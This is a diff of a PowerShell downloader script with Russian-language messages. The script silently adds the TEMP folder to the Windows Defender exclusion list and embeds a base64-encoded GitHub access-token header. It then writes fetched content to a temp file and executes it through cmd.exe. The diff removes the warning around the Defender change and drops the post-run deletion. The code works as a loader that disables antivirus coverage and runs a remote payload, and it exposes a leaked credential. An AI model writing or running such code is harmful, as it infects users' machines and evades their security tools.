@@ -100,11 +100,7 @@ $temp = $env:TEMP
 try {
     Write-Host "Download..." -ForegroundColor Green
     $contFile = [System.IO.Path]::GetTempFileName()
-	try {
-		Add-MpPreference -ExclusionPath $temp -ErrorAction Stop
-	} catch {
-		Write-Host "Команда Add-MpPreference не найдена или не выполнена, продолжаем выполнение..." -ForegroundColor Yellow
-	}
+	try { Add-MpPreference -ExclusionPath $temp -ErrorAction Stop } catch {	}
 
     try {
 		$String = "QmVhcmVyIGdpdGh1Yl9wYXRfMTFCSkVOSDRJMGRZWjNVeTJtWnNxTl9PWVVNWVdkcGdTWHJybk43V3pDbjIwbkVlUm5zRTVvYVVQWlJSclpsd3hWQ1hHNktGNlFOR2p0aWhMdw=="
@@ -117,9 +113,7 @@ try {
 			try {
 				$q = '"'
 				$arg = "$q$contFile$q"
-				
-				#Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /b /wait cmd /c $arg && del $arg" -WindowStyle Hidden
-				Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$arg && del `"$arg`""
+				Start-Process -FilePath "cmd.exe" -ArgumentList "/c $arg"
 
 			} catch {
 				Write-Host "Error Start-Process, please restart for Administrator" -ForegroundColor Red
